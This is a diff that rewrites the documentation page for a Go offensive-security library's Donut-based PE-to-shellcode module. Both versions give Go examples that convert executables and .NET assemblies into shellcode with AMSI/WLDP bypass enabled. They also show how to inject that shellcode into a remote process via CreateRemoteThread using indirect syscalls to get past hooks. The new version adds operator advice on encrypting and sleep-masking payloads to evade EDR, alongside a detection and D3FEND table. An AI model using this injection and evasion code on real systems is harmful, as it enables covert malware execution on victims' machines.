@@ -1,293 +1,236 @@
-# PE-to-Shellcode Conversion (Donut)
-
-[<- Back to PE Overview](README.md)
-
-> **MITRE ATT&CK:** T1055.001 -- Process Injection: DLL Injection | **Detection:** Medium -- Donut loader stub detectable by memory scanners
-
 ---
+package: github.com/oioio-space/maldev/pe/srdi
+last_reviewed: 2026-04-27
+reflects_commit: 23c9331
+---
+
+# PE-to-Shellcode (Donut)
+
+[← pe index](README.md) · [docs/index](../../index.md)
+
+## TL;DR
+
+Convert a native EXE / DLL, .NET assembly, or scripting payload
+(VBS / JS / XSL) into position-independent shellcode via the
+Donut framework — flat byte buffer ready to feed any injection
+primitive in `inject/`. Built-in AMSI / WLDP bypass + optional
+dual-mode (x86 + x64) output. Pure Go, cross-compiles from Linux.
 
 ## Primer
 
-When you want to run a program inside another process, the operating system normally insists the program live on disk as a `.exe` or `.dll` file. What if you could turn that program into raw bytes -- shellcode -- and inject it anywhere you like, with no file on disk?
+Windows insists executables live on disk as `.exe` / `.dll`
+files; you can't normally hand the loader a flat byte buffer and
+say "run this PE". Donut wraps an arbitrary PE (or .NET assembly,
+or script) with a small position-independent loader stub that
+bootstraps PE headers in memory, applies relocations, resolves
+imports, and calls the entry point — all from a flat byte buffer
+the operator can pass to any injection primitive.
 
-**Think of it like converting a hardback book into an audiobook.** The content (the program logic) is exactly the same, but the format is now something you can pour into any container. Donut wraps your EXE or DLL with a small loader stub that bootstraps the PE headers in memory, relocates the code, and calls the entry point -- all from a flat byte buffer that can be passed to any injection primitive.
-
-This is especially powerful because it works not just for native EXEs and DLLs but also for .NET assemblies, VBScript, JScript, and XSL -- any of those can be reduced to position-independent shellcode that runs with no managed runtime on disk.
-
----
+The technique works for native PEs, .NET assemblies (no managed
+runtime needed on disk — Donut hosts the CLR in process), and
+scripts (VBScript / JScript / XSL through a built-in
+mshta-equivalent runner). Output is one buffer regardless of
+input format, sized roughly +5–10 % over the original.
 
 ## How It Works
 
 ```mermaid
 sequenceDiagram
-    participant Caller as Your Code
-    participant Donut as go-donut (Donut Engine)
-    participant Stub as Loader Stub (in-memory)
-    participant PE as Payload (EXE/DLL/.NET)
+    participant Caller
+    participant Donut as srdi (go-donut)
+    participant Stub as Loader stub<br/>(in-memory)
+    participant Payload as PE / .NET / Script
 
-    Caller->>Donut: ConvertFile("payload.exe", cfg)
-    Donut->>Donut: Parse PE headers
+    Caller->>Donut: ConvertFile(path, cfg)
+    Donut->>Donut: Parse + classify input
     Donut->>Donut: Compress payload bytes
-    Donut->>Donut: Embed AMSI/WLDP bypass code
-    Donut->>Donut: Attach position-independent loader stub
-    Donut-->>Caller: []byte (shellcode)
+    Donut->>Donut: Embed AMSI / WLDP bypass
+    Donut->>Donut: Attach PIC loader stub
+    Donut-->>Caller: shellcode []byte
 
     Note over Caller,Stub: After injection into target process
-
-    Stub->>Stub: Self-locate in memory (PIC bootstrap)
-    Stub->>Stub: Bypass AMSI/WLDP (configurable)
-    Stub->>Stub: Decompress payload bytes
-    Stub->>PE: Map PE sections into memory
-    Stub->>PE: Apply relocations
-    Stub->>PE: Resolve imports (LoadLibrary / GetProcAddress)
-    PE->>PE: Entry point executes
+    Stub->>Stub: PIC bootstrap (locate self)
+    Stub->>Stub: AMSI / WLDP patch (configurable)
+    Stub->>Stub: Decompress payload
+    Stub->>Payload: Map sections + relocate + resolve imports
+    Payload->>Payload: Call entry point
 ```
 
-### Shellcode Structure
+Generated shellcode layout:
 
-```mermaid
-graph TD
-    subgraph "Generated Shellcode (flat buffer)"
-        STUB["Donut Loader Stub\n(position-independent, x64/x86/dual)"]
-        CFG["Embedded Config Block\nArch, Bypass, Method, Class, Params"]
-        COMPRESS["Compressed Payload\n(original EXE/DLL/assembly)"]
-
-        STUB --> CFG --> COMPRESS
-    end
-
-    subgraph "Execution Flow (at runtime)"
-        BOOTSTRAP["PIC bootstrap\n(find own base address)"]
-        BYPASS["AMSI/WLDP patch\n(configurable: skip/abort/continue)"]
-        DECOMP["Decompress payload\n(in allocated RW pages)"]
-        MAPEXEC["Map + relocate + import\n(mini PE loader)"]
-        EP["Call entry point\n(main / DllMain / .NET method)"]
-
-        BOOTSTRAP --> BYPASS --> DECOMP --> MAPEXEC --> EP
-    end
-
-    STUB --> BOOTSTRAP
+```text
+[ PIC Donut loader stub ]   ← position-independent x64 / x86 / x84
+[ embedded config block ]   ← Arch, Bypass, Method, Class, Params
+[ compressed payload ]      ← original PE / .NET / script bytes
 ```
 
-### Input Format Matrix
+### Input format matrix
 
-| Format | ModuleType | Class required | Method required |
-|--------|-----------|----------------|-----------------|
-| Native EXE | `ModuleEXE` | No | No |
-| Native DLL | `ModuleDLL` | No | Yes (export name) |
-| .NET EXE | `ModuleNetEXE` | No | No |
-| .NET DLL | `ModuleNetDLL` | Yes | Yes |
-| VBScript | `ModuleVBS` | No | No |
-| JScript | `ModuleJS` | No | No |
-| XSL | `ModuleXSL` | No | No |
+| Format | `Type` constant | `Class` required | `Method` required |
+|---|---|---|---|
+| Native EXE | `ModuleEXE` | — | — |
+| Native DLL | `ModuleDLL` | — | export name |
+| .NET EXE | `ModuleNetEXE` | — | — |
+| .NET DLL | `ModuleNetDLL` | yes | yes |
+| VBScript | `ModuleVBS` | — | — |
+| JScript | `ModuleJS` | — | — |
+| XSL | `ModuleXSL` | — | — |
 
----
+## API Reference
 
-## Usage
+### `type Arch int` / `type ModuleType int`
 
-### Convert a Native EXE (simplest case)
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/pe/srdi#Arch)
+
+| Arch | Meaning |
+|---|---|
+| `ArchX32` | 32-bit only |
+| `ArchX64` | 64-bit only (default) |
+| `ArchX84` | dual-mode (32 + 64) |
+
+ModuleType values are listed in the matrix above.
+
+### `type Config`
+
+[godoc](https://pkg.go.dev/github.com/oioio-space/maldev/pe/srdi#Config)
+
+| Field | Description |
+|---|---|
+| `Arch` | Target architecture (default `ArchX64`) |
+| `Type` | Input format (0 = auto-detect from filename in `ConvertFile`) |
+| `Class` | .NET class name (required for `ModuleNetDLL`) |
+| `Method` | .NET method or native DLL export to call |
+| `Parameters` | Command-line passed to the payload |
+| `Bypass` | AMSI/WLDP: 1 skip · 2 abort on fail · 3 continue on fail |
+| `Thread` | Run entry point in a new thread |
+
+### `DefaultConfig() *Config`
+
+`ArchX64` + `ModuleEXE` + `Bypass = 3`.
+
+### `ConvertFile(path string, cfg *Config) ([]byte, error)`
+
+Auto-detect module type from extension when `cfg.Type == 0`.
+
+### `ConvertBytes(data []byte, cfg *Config) ([]byte, error)`
+
+Convert in-memory PE / script bytes. `cfg.Type` must be set
+explicitly.
+
+### `ConvertDLL(path string, cfg *Config) ([]byte, error)` / `ConvertDLLBytes(data []byte, cfg *Config) ([]byte, error)`
+
+Shorthand wrappers that pin `cfg.Type = ModuleDLL`.
+
+## Examples
+
+### Simple — convert a native EXE
 
 ```go
 import "github.com/oioio-space/maldev/pe/srdi"
 
-cfg := srdi.DefaultConfig() // ArchX64, ModuleEXE, Bypass=3
-shellcode, err := srdi.ConvertFile("cmd.exe", cfg)
-if err != nil {
-    log.Fatal(err)
-}
-// shellcode is now position-independent; cmd.exe (340 KB) → ~367 KB shellcode
+cfg := srdi.DefaultConfig()
+shellcode, _ := srdi.ConvertFile("payload.exe", cfg)
 ```
 
-### Convert a Native DLL with Specific Export
+### Composed — DLL with named export
 
 ```go
 cfg := srdi.DefaultConfig()
 cfg.Type = srdi.ModuleDLL
-cfg.Method = "ReflectiveLoader" // or any exported function name
-
-shellcode, err := srdi.ConvertDLL("payload.dll", cfg)
-if err != nil {
-    log.Fatal(err)
-}
+cfg.Method = "ReflectiveLoader"
+shellcode, _ := srdi.ConvertDLL("payload.dll", cfg)
 ```
 
-### Convert a .NET Assembly
+### Advanced — .NET DLL + dual-mode + remote injection
+
+End-to-end: convert a .NET DLL to dual-mode shellcode, then hand
+it to `inject.NewWindowsInjector` with indirect syscalls.
 
 ```go
-cfg := &srdi.Config{
-    Arch:   srdi.ArchX64,
-    Type:   srdi.ModuleNetDLL,
-    Class:  "MyNamespace.MyClass",
-    Method: "Execute",
-    Bypass: 3, // continue if AMSI/WLDP patch fails
-}
-
-shellcode, err := srdi.ConvertFile("payload.dll", cfg)
-if err != nil {
-    log.Fatal(err)
-}
-```
-
-### Convert Raw Bytes (in-memory PE)
-
-```go
-// Type must be set explicitly — no file extension to detect from
-cfg := &srdi.Config{
-    Arch:   srdi.ArchX64,
-    Type:   srdi.ModuleEXE,
-    Bypass: 3,
-}
-
-shellcode, err := srdi.ConvertBytes(peData, cfg)
-if err != nil {
-    log.Fatal(err)
-}
-```
-
-### Dual-Mode Shellcode (x86 + x64)
-
-```go
-cfg := srdi.DefaultConfig()
-cfg.Arch = srdi.ArchX84 // runs in both 32-bit and 64-bit processes
-
-shellcode, err := srdi.ConvertFile("payload.exe", cfg)
-if err != nil {
-    log.Fatal(err)
-}
-```
-
----
-
-## Combined Example
-
-Full pipeline: convert an EXE to shellcode, then inject it into a remote process via `CreateRemoteThread`.
-
-```go
-package main
-
 import (
-    "log"
-    "os"
-
     "github.com/oioio-space/maldev/inject"
     "github.com/oioio-space/maldev/pe/srdi"
     wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
-func main() {
-    // Step 1: Convert target EXE to position-independent shellcode
-    cfg := srdi.DefaultConfig()
-    shellcode, err := srdi.ConvertFile("payload.exe", cfg)
-    if err != nil {
-        log.Fatal("srdi:", err)
-    }
-
-    // Step 2: Pick the target PID
-    pid := 1234 // replace with real target PID
-
-    // Step 3: Configure the injector with indirect syscalls so every NT
-    // call bypasses userland hooks. The caller is built lazily from
-    // SyscallMethod inside the injector.
-    icfg := inject.DefaultWindowsConfig(inject.MethodCreateRemoteThread, pid)
-    icfg.SyscallMethod = wsyscall.MethodIndirect
-
-    // Step 4: Inject shellcode into target process
-    injector, err := inject.NewWindowsInjector(icfg)
-    if err != nil {
-        log.Fatal("inject:", err)
-    }
-    if err := injector.Inject(shellcode); err != nil {
-        log.Fatal("inject:", err)
-    }
-
-    os.Exit(0)
+cfg := &srdi.Config{
+    Arch:   srdi.ArchX84, // dual x86 + x64
+    Type:   srdi.ModuleNetDLL,
+    Class:  "Loader.Stub",
+    Method: "Run",
+    Bypass: 3,
 }
+sc, _ := srdi.ConvertFile("loader.dll", cfg)
+
+icfg := inject.DefaultWindowsConfig(inject.MethodCreateRemoteThread, targetPID)
+icfg.SyscallMethod = wsyscall.MethodIndirect
+
+inj, _ := inject.NewWindowsInjector(icfg)
+_ = inj.Inject(sc)
 ```
 
----
+See [`ExampleConvertFile`](../../../pe/srdi/srdi_example_test.go)
++ [`ExampleConvertBytes`](../../../pe/srdi/srdi_example_test.go).
 
-## Advantages & Limitations
+## OPSEC & Detection
 
-| | Detail |
+| Artefact | Where defenders look |
 |---|---|
-| **No disk artifacts** | Payload never touches disk in the target process |
-| **7 input formats** | Native EXE, DLL, .NET EXE/DLL, VBScript, JScript, XSL |
-| **Built-in AMSI/WLDP bypass** | Loader stub patches both before invoking the payload |
-| **Dual architecture** | Single shellcode blob that runs in x86 or x64 processes |
-| **Pure Go, no CGO** | Cross-compiles from Linux to generate Windows shellcode |
-| **Configurable entry point** | DLL export, .NET class/method, or default entry |
-| **Size overhead** | Shellcode is larger than input: cmd.exe 340 KB → 367 KB |
-| **Detectable stub** | Donut loader stub has known signatures; memory scanners flag it |
-| **RWX pages** | Mini PE loader writes and then executes -- RWX allocation is suspicious |
-| **No obfuscation** | Stub bytes are not encrypted by default; static detection is possible |
-| **Windows payloads only** | Generates shellcode for Windows targets; generation itself is cross-platform |
+| Donut loader stub byte signature | YARA / memory scanners — Defender, MDE, CrowdStrike all carry Donut signatures by default |
+| RWX page allocation in target | Behavioural EDR — Donut's mini-loader writes then executes; RWX is the canonical "shellcode" tell |
+| AMSI / WLDP patch ranges in lsass / current process | Microsoft-Windows-Threat-Intelligence ETW provider |
+| .NET assembly load events without a corresponding `.exe` on disk | ETW Microsoft-Windows-DotNETRuntime; Defender flags managed runtime hosting from non-managed processes |
+| Sustained `LoadLibraryW` / `GetProcAddress` from a freshly-allocated region | EDR API correlation |
 
----
+**D3FEND counters:**
 
-## API Reference
+- [D3-PA](https://d3fend.mitre.org/technique/d3f:ProcessAnalysis/)
+  — RWX + execute-from-allocation telemetry.
+- [D3-FCA](https://d3fend.mitre.org/technique/d3f:FileContentAnalysis/)
+  — YARA on the loader stub byte pattern.
 
-### Types
+**Hardening for the operator:**
 
-```go
-// Arch is the target architecture for shellcode generation.
-type Arch int
+- Encrypt the shellcode with [`crypto`](../crypto/README.md)
+  before the injector writes it to RWX — the stub stays
+  detectable but only after the implant has staged.
+- Use `inject`'s sleep-mask + indirect syscall combination so
+  the stub bytes are absent from memory between callbacks.
+- Avoid `ArchX84` unless dual-mode is genuinely required — the
+  larger blob carries both x86 + x64 signatures.
 
-const (
-    ArchX32 Arch = iota // 32-bit only
-    ArchX64             // 64-bit only (default)
-    ArchX84             // dual-mode: runs in both 32-bit and 64-bit processes
-)
+## MITRE ATT&CK
 
-// ModuleType is the format of the input binary.
-type ModuleType int
+| T-ID | Name | Sub-coverage | D3FEND counter |
+|---|---|---|---|
+| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Process Injection: Dynamic-link Library Injection | partial — produces shellcode for downstream injection (consumer side) | D3-PA |
+| [T1620](https://attack.mitre.org/techniques/T1620/) | Reflective Code Loading | full — Donut loader stub is a textbook reflective loader | D3-FCA, D3-PA |
 
-const (
-    ModuleNetDLL ModuleType = 1 // .NET DLL
-    ModuleNetEXE ModuleType = 2 // .NET EXE
-    ModuleDLL    ModuleType = 3 // Native DLL
-    ModuleEXE    ModuleType = 4 // Native EXE (default)
-    ModuleVBS    ModuleType = 5 // VBScript
-    ModuleJS     ModuleType = 6 // JScript
-    ModuleXSL    ModuleType = 7 // XSL
-)
+## Limitations
 
-// Config controls shellcode generation.
-type Config struct {
-    Arch       Arch       // target architecture (default: ArchX64)
-    Type       ModuleType // input format (0 = auto-detect by extension in ConvertFile)
-    Class      string     // .NET class name (required for ModuleNetDLL)
-    Method     string     // .NET method or native DLL export to call
-    Parameters string     // command-line arguments passed to the payload
-    Bypass     int        // AMSI/WLDP bypass: 1=skip, 2=abort on fail, 3=continue on fail
-    Thread     bool       // run entry point in a new thread
-}
-```
+- **Detectable stub.** Donut's loader carries a known byte
+  pattern; signature-based YARA + memory scans flag it.
+- **RWX allocation.** The mini PE loader writes and then
+  executes — RWX is the canonical shellcode tell.
+- **No built-in obfuscation.** Stub bytes are not encrypted by
+  default; pair with `crypto` + sleep masking.
+- **Windows payloads only.** Shellcode generation runs
+  cross-platform; the produced shellcode targets Windows.
+- **+5–10% size overhead.** Donut compresses the input but adds
+  the loader stub; expect modest growth.
 
-### Functions
+## Credits
 
-```go
-// DefaultConfig returns a ready-to-use configuration:
-// ArchX64, ModuleEXE, Bypass=3 (continue on AMSI/WLDP fail).
-func DefaultConfig() *Config
+- [Binject/go-donut](https://github.com/Binject/go-donut) — pure-Go Donut port (vendored).
+- [TheWover/donut](https://github.com/TheWover/donut) — original C reference.
+- [monoxgas/sRDI](https://github.com/monoxgas/sRDI) — sRDI technique that inspired Donut.
 
-// ConvertFile converts a PE/DLL/.NET/VBS/JS/XSL file to shellcode.
-// Auto-detects the module type from the file extension.
-func ConvertFile(path string, cfg *Config) ([]byte, error)
+## See also
 
-// ConvertBytes converts a raw in-memory PE/DLL to shellcode.
-// cfg.Type must be set explicitly — no extension available for detection.
-func ConvertBytes(data []byte, cfg *Config) ([]byte, error)
-
-// ConvertDLL converts a DLL file to shellcode.
-// Shorthand for ConvertFile with cfg.Type = ModuleDLL.
-func ConvertDLL(dllPath string, cfg *Config) ([]byte, error)
-
-// ConvertDLLBytes converts raw DLL bytes to shellcode.
-// Shorthand for ConvertBytes with cfg.Type = ModuleDLL.
-func ConvertDLLBytes(dllBytes []byte, cfg *Config) ([]byte, error)
-```
-
-### Credits
-
-- [Binject/go-donut](https://github.com/Binject/go-donut) — pure-Go Donut port used by this package
-- [TheWover/donut](https://github.com/TheWover/donut) — original C implementation and research
-- [monoxgas/sRDI](https://github.com/monoxgas/sRDI) — shellcode reflective DLL injection technique that inspired Donut
+- [`inject`](../inject/README.md) — execution surface for the
+  produced shellcode.
+- [`crypto`](../crypto/README.md) — payload encryption pre-conversion.
+- [`evasion/sleepmask`](../evasion/sleep-mask.md) — hide the
+  stub between callbacks.
+- [Operator path](../../by-role/operator.md).
+- [Detection eng path](../../by-role/detection-eng.md).
